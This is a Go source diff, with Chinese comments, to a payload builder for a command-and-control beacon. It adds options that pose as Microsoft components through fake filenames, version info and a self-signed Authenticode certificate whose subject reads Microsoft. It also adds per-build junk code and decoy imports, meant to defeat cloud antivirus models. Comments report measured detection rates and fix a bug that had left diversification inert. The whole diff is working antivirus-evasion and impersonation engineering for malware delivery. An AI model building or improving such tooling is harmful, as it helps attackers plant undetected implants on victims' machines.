@@ -367,10 +367,21 @@ type GenerateConfig struct {
 	SideloadingContent string `json:"sideloading_content" ax:"label=合法 DLL 文件;group=图标与侧载;file=.dll;showif=format:DLL;hint=作为导出表来源；勾了侧载但留空会构建失败;order=-2"`
 	IconContent        string `json:"icon_content" ax:"label=ICO 文件;group=图标与侧载;file=.ico;showif=format:Exe,Service Exe,DLL;hint=留空 = 用默认图标；与「随机 ICO」同时勾选时以随机为准"`
 	IconRandom         bool   `json:"icon_random" ax:"label=随机生成 ICO;group=图标与侧载;showif=format:Exe,Service Exe,DLL;order=-1"`
-	ExePseudoSign      bool   `json:"exe_pseudo_sign" ax:"label=Exe 伪 Authenticode 签名;group=进程与签名;showif=format:Exe,Service Exe;hint=随机自签名；服务端缺 openssl/osslsigncode 时跳过并记构建日志，不失败"`
+	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_PSEUDO_SIGN（当前 := true）；
+	// 控制台显式勾选/取消则以控制台为准。三种取值语义见 effectiveExePseudoSign()。
+	ExePseudoSign *bool `json:"exe_pseudo_sign" ax:"label=Exe 伪 Authenticode 签名;group=进程与签名;showif=format:Exe,Service Exe;hint=★ 默认关（buildenv.mk 的 BEACON_PSEUDO_SIGN=false）：实测自签名会把产物推进查杀（开 0/12 过 vs 关 7/9 过），换中性证书主体也救不了；服务端缺 openssl/osslsigncode 时跳过并记构建日志，不失败"`
 	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD（当前 := true）；
 	// 控制台显式勾选/取消则以控制台为准。三种取值语义见 effectivePeHeaderMod()。
 	PeHeaderMod *bool `json:"pe_header_mod" ax:"label=PE Header 改写（Rich header）;group=进程与签名;showif=format:Exe,Service Exe,DLL;hint=默认跟随 buildenv.mk 的 BEACON_PE_HEADER_MOD=true；用 pe_header_mod.py 覆写 Rich header，做 per-build 多样化"`
+	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_DIVERSIFY（当前 := true）；
+	// 控制台显式勾选/取消则以控制台为准。三种取值语义见 effectiveDiversify()。
+	// ★ 以前这个开关只存在于 buildenv.mk，操作员在生成时无法关掉 —— 而它正是
+	//   "本次产物和上一次长得像不像" 的唯一旋钮，出问题时要能单独摘出来做对照。
+	Diversify *bool `json:"diversify" ax:"label=per-build 多样化（junk + decoy 导入）;group=进程与签名;showif=format:Exe,Service Exe,DLL;hint=默认跟随 buildenv.mk 的 BEACON_DIVERSIFY=true；让每次生成的 .text/.idata 不同，避免云模型收敛到单一模式"`
+	// nil / 省略 ⇒ 跟随 buildenv.mk 的 BEACON_DISGUISE（当前 := true）。
+	// true = 冒充微软自家组件；false = 中性身份（虚构厂商 Northwind + 通用进程名）。
+	// 三种取值语义见 effectiveDisguise()。
+	Disguise *bool `json:"disguise" ax:"label=伪装成微软组件;group=进程与签名;showif=format:Exe,Service Exe,DLL;hint=默认跟随 buildenv.mk 的 BEACON_DISGUISE=true；开启后文件名/版本信息都伪装成微软自家程序（smartscreen / MpCmdRun …），关闭则用中性身份（不冒充真实厂商）"`
 	DnsResolvers       string `json:"dns_resolvers" ax:"label=DNS 解析器;group=DNS;showif=listener:BeaconDNS;hint=逗号分隔；留空则用监听器上的 resolvers（pl_utils.go:483）"`
 	DohResolvers       string `json:"doh_resolvers" ax:"label=DoH 解析器;group=DNS;showif=listener:BeaconDNS;hint=逗号分隔；留空则用插件内置默认（pl_utils.go:488）"`
 	DnsMode            string `json:"dns_mode" ax:"label=DNS 模式;group=DNS;showif=listener:BeaconDNS;order=-1"`
@@ -423,6 +434,40 @@ func (c GenerateConfig) effectivePeHeaderMod() bool {
 		return buildEnv["BEACON_PE_HEADER_MOD"] == "true"
 	}
 	return *c.PeHeaderMod
+}
+
+// effectiveExePseudoSign 决出这次构建要不要跑伪签名。
+//
+// ★ 这个字段原先是**值类型 bool**，于是"省略这个键"= 零值 false = 不签名 ——
+//   而 buildenv.mk 的 BEACON_PSEUDO_SIGN（:= true）、ax_config.axs 的
+//   checkExePseudoSign.setChecked(true)、Generate.tsx 的 defaultAgentConfig 全都写着
+//   默认开。三方说开、实现说关，只有**经过 UI** 的调用能签上名；任何脚本/API 调用
+//   只要不带这个键，出来的就是一个"自称 Microsoft 却没有签名"的产物 ——
+//   比不伪装更可疑（正常 Windows 二进制不会既是 Microsoft 的又没有签名）。
+//   改成 *bool 后与 IatHiding / PeHeaderMod 同口径：省略 = 跟随 buildenv。
+func (c GenerateConfig) effectiveExePseudoSign() bool {
+	if c.ExePseudoSign == nil {
+		return buildEnv["BEACON_PSEUDO_SIGN"] == "true"
+	}
+	return *c.ExePseudoSign
+}
+
+// effectiveDiversify 决出这次构建要不要跑 L2 per-build 多样化（junk 函数 + decoy 导入）。
+// 与上面两个同口径：nil ⇒ 跟随 buildenv.mk 的 BEACON_DIVERSIFY。
+func (c GenerateConfig) effectiveDiversify() bool {
+	if c.Diversify == nil {
+		return buildEnv["BEACON_DIVERSIFY"] == "true"
+	}
+	return *c.Diversify
+}
+
+// effectiveDisguise 决出这次构建用哪套身份（文件名 + 版本信息 + 签名主体同源）。
+// 与上面几个同口径：nil ⇒ 跟随 buildenv.mk 的 BEACON_DISGUISE。
+func (c GenerateConfig) effectiveDisguise() bool {
+	if c.Disguise == nil {
+		return buildEnv["BEACON_DISGUISE"] == "true"
+	}
+	return *c.Disguise
 }
 
 // peFormat 只对有 PE 头的产物成立（Shellcode / Hex C 没有头可改）。
@@ -537,12 +582,44 @@ var benignExePool = []benignExe{
 	{"LogonUI", "Windows Logon User Interface Host", "Microsoft® Windows® Operating System"},
 }
 
+// neutralExePool 是**关掉伪装**（BEACON_DISGUISE=false）时的身份池。
+//
+// 和 benignExePool 的区别只有一个：**不冒充真实厂商**。
+// 厂商是虚构的 Northwind（微软自家文档里的占位公司名），进程名/描述都是通用词，
+// 不指向任何一个真实存在的 Windows 组件 —— 所以"文件自称 X"与"X 其实不是这样"
+// 之间不存在可被抓住的矛盾。
+//
+// ★ 为什么要留这一档：benignExePool 造出来的产物是"自称微软 Defender 组件、
+//   却由 MinGW 编译、且没有微软签名"。这三点放一起本身就是一条强特征。
+//   把品牌摘掉后，产物退化成"一个没人认识的普通小程序"——
+//   通常不如伪装好看，但**不需要用签名去圆谎**。
+var neutralExePool = []benignExe{
+	{"updater", "Software Updater", "Northwind Client Utilities"},
+	{"helper", "Helper Service", "Northwind Client Utilities"},
+	{"runner", "Background Runner", "Northwind Client Utilities"},
+	{"monitor", "System Monitor", "Northwind Client Utilities"},
+	{"notifier", "Notification Service", "Northwind Client Utilities"},
+	{"tasksvc", "Task Service", "Northwind Client Utilities"},
+	{"syncsvc", "Sync Service", "Northwind Client Utilities"},
+	{"devhelper", "Device Helper", "Northwind Client Utilities"},
+}
+
+// neutralSignIssuer 是中性伪装下使用的厂商名。Northwind 是虚构的占位公司名，
+// 不用真实厂商（那会把"冒充"从一个对象换成另一个对象，没有解决问题）。
+const neutralSignIssuer = "Northwind Software Inc"
+
 // microsoftSignSubject 是伪签名用的证书主体 —— 照抄微软自家 Authenticode 证书的
 // 结构。★ 它只是**外观**：自签名的根不在任何信任链里，签名校验（signtool verify
 // / 驱动加载 / 部分 EDR 的签名策略）依然判为不受信任。它的作用是让"右键 → 数字签名"
 // 那一栏看起来和一份正常 Windows 程序一致，而不是 `CN=App-3F2A1B`。
 func microsoftSignSubject() string {
 	return "/C=US/ST=Washington/L=Redmond/O=Microsoft Corporation/OU=Microsoft Corporation/CN=Microsoft Windows"
+}
+
+// neutralSignSubject 是关掉伪装时的证书主体 —— 与 neutralExePool / identityCompany 同源，
+// 仍是一份完整的 DN，只是主体是**虚构厂商**，不冒充任何真实公司。
+func neutralSignSubject() string {
+	return "/C=US/ST=California/L=San Jose/O=" + neutralSignIssuer + "/OU=Digital Operations/CN=" + neutralSignIssuer
 }
 
 func generateRandomString(n int) string {
@@ -625,9 +702,11 @@ func generateDiversificationC() string {
 		chosen[api] = true
 		b.WriteString(fmt.Sprintf("    volatile void (*volatile p%d)() = (void(*)())%s; (void)p%d;\n", i, api, i))
 	}
-	// reference one junk function so the linker keeps all junk
-	if len(junkNames) > 0 {
-		b.WriteString(fmt.Sprintf("    %s();\n", junkNames[0]))
+	// ★ 必须**逐个**引用。`__attribute__((used))` 只挡得住编译器丢弃，挡不住链接器的
+	//   --gc-sections；而 -ffunction-sections 下每个 junk 函数各占一节，只调第一个的话
+	//   其余 7~11 个照样被回收 —— 那样多样化的实际变化量只剩一个函数。
+	for _, n := range junkNames {
+		b.WriteString(fmt.Sprintf("    %s();\n", n))
 	}
 	b.WriteString("}\n")
 	return b.String()
@@ -1059,7 +1138,16 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	// 本次生成伪装成哪个程序 —— **只在这里取一次**，文件名 / 版本信息 / 签名主体
 	// 三处全部用它，保证同一个产物自己前后一致。
 	// 每次生成随机取（不是固定一个）：固定名会让多份样本在目标机/沙箱里互相关联。
-	chosen := benignExePool[rand.IntN(len(benignExePool))]
+	//
+	// ★ 身份池由 effectiveDisguise() 选：开 = 冒充微软自家组件，关 = 中性虚构厂商。
+	//   两套池的子结构完全一样，所以下游（文件名/版本信息/签名主体）一个字都不用改。
+	identityPool := benignExePool
+	identityCompany := "Microsoft Corporation"
+	if !generateConfig.effectiveDisguise() {
+		identityPool = neutralExePool
+		identityCompany = neutralSignIssuer
+	}
+	chosen := identityPool[rand.IntN(len(identityPool))]
 	Filename = chosen.name
 
 	svcName := ""
@@ -1289,7 +1377,7 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		//   "文件叫 RuntimeBroker.exe、属性里写着 Notepad" 这种自相矛盾。
 		type viEntry struct{ company, desc, internal, orig, product string }
 		vi := viEntry{
-			"Microsoft Corporation",
+			identityCompany,
 			chosen.desc,
 			chosen.name,
 			chosen.name + ".exe",
@@ -1352,16 +1440,25 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	// functions + random decoy API references (varies .text hash + IAT per build
 	// so QVM cloud ML can't converge on a single pattern). Compiled as a
 	// separate .o and linked in.
-	if buildEnv["BEACON_DIVERSIFY"] == "true" {
+	if generateConfig.effectiveDiversify() {
 		divSrc := tempDir + "/diversify.c"
 		divObj := tempDir + "/diversify" + Ext
 		if err := os.WriteFile(divSrc, []byte(generateDiversificationC()), 0600); err == nil {
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Compiling per-build diversification (junk + decoy imports)...")
-			divArgs := append(strings.Fields(cFlags), "-D", "BEACON_"+strings.ToUpper(protocol), "-c", divSrc, "-o", divObj)
+			// ★ `-x c` 不能省：generateDiversificationC() 产出的是 **C**，而 Compiler 是
+			//   `x86_64-w64-mingw32-g++` —— g++ 按**文件扩展名以外的规则**把 `.c` 也当 C++ 编，
+			//   于是 `volatile void (*volatile p0)() = (void(*)())GetModuleHandleW;` 这种
+			//   合法 C 直接变成 C++ 硬错误（invalid conversion from 'void (*)()' to
+			//   'volatile void (*)()'）。少了这两个字，diversify.o **永远编不出来**，
+			//   而失败只写一行 BUILD_LOG_INFO —— 结果就是每次生成出来的载荷 `.text` 逐字节
+			//   相同（实测两次独立构建差异全在 .rsrc/证书，代码段 0 差异），per-build 多样化
+			//   形同虚设，云模型一个样本就能锁死整批载荷。
+			divArgs := append(strings.Fields(cFlags), "-D", "BEACON_"+strings.ToUpper(protocol), "-c", "-x", "c", divSrc, "-o", divObj)
 			if err := Ts.TsAgentBuildExecute(profile.BuilderId, tempDir, Compiler, divArgs...); err == nil {
 				Files += divObj + " "
 			} else {
-				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, fmt.Sprintf("diversify compile skipped: %v", err))
+				// 用 ERROR 而不是 INFO：这条以前是 INFO，没人看见，一挂就是几个月。
+				_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_ERROR, fmt.Sprintf("diversify compile FAILED (payload will be byte-identical to previous builds): %v", err))
 			}
 		}
 	}
@@ -1417,10 +1514,12 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	}
 
 	finalExePath := buildPath
-	// ★ 原来只判 Format、不判开关：ExePseudoSign 在 :326 声明、Generate.tsx / ax_config.axs /
+	// ★ 原来只判 Format、不判开关：ExePseudoSign 声明了、Generate.tsx / ax_config.axs /
 	//   webdelivery 都往里填了值，却**没有任何地方读它** ⇒ 勾选框是惰性的（取消勾选也照样签名，
-	//   工具缺失时照样让生成失败）。这里补上开关判断，与 gopher_agent/pl_main.go 同口径。
-	if (generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe") && generateConfig.ExePseudoSign {
+	//   工具缺失时照样让生成失败）。补上开关判断，与 gopher_agent/pl_main.go 同口径。
+	// ★ 再补一层：开关本身得是**三态**的（省略 = 跟随 buildenv.mk），否则不带这个键的
+	//   API 调用会静默拿到未签名产物 —— 见 effectiveExePseudoSign()。
+	if (generateConfig.Format == "Exe" || generateConfig.Format == "Service Exe") && generateConfig.effectiveExePseudoSign() {
 		// ★ 工具缺失时降级为不签名并继续（同上方 :1254 pe_header_mod.py 缺失的处理）。
 		//   伪签名是让产物"看起来有签名"的美化步骤，缺一个可选工具不该让最常见的 EXE 载荷
 		//   完全生成不出来（实测：控制台点「生成并下载」直接红字
@@ -1432,7 +1531,13 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		} else {
 			signedPath := tempDir + "/file_signed.exe"
 			_ = Ts.TsAgentBuildLog(profile.BuilderId, adaptix.BUILD_LOG_INFO, "Applying random self-signed Authenticode (openssl + osslsigncode)...")
-			if err := applySelfSignedAuthenticode(buildPath, signedPath, tempDir, microsoftSignSubject()); err != nil {
+			// 证书主体跟着身份池走：冒充微软时用微软 DN，中性身份时用虚构厂商 DN。
+			// 三处同源（文件名 / 版本信息 / 签名主体）这条原则在这里同样成立。
+			signSubject := microsoftSignSubject()
+			if !generateConfig.effectiveDisguise() {
+				signSubject = neutralSignSubject()
+			}
+			if err := applySelfSignedAuthenticode(buildPath, signedPath, tempDir, signSubject); err != nil {
 				_ = os.RemoveAll(tempDir)
 				return nil, "", err
 			}
